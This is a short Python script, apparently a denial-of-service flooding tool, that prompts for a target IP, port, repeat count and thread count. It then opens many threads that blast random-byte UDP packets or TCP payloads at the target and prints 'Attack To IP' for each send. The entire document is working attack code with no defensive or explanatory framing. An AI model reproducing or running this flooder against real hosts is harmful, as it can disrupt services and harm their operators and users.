import sys
import socket
import random
import threading
import time

print('Credit By Banu.')
print('Tools Strong!!.')
method = str(input('Method: '))
ip = str(input('Ip: '))
port = int(input('Port: '))
times = int(input('Times: '))
threads = int(input('Threads: '))

def udp():
  data = random._urandom(615)
  for x in range(times):
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
      #while True:
          s.sendto(data,addr)
          print("UDP Attack To IP", ip, "PORT", port)
    except:
      s.close()

def tcp():
  data = random._urandom(3615)
  for x in range(times):
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
          s.send(data)
          print("\033[1;36;40mTcp Attack To IP", ip, "PORT", port)
    except:
      s.close()

for y in range(threads):
  if method == 'UDP':
    th = threading.Thread(target = udp)
    th.start()
  elif method == 'TCP':
    th = threading.Thread(target = tcp)
    th.start()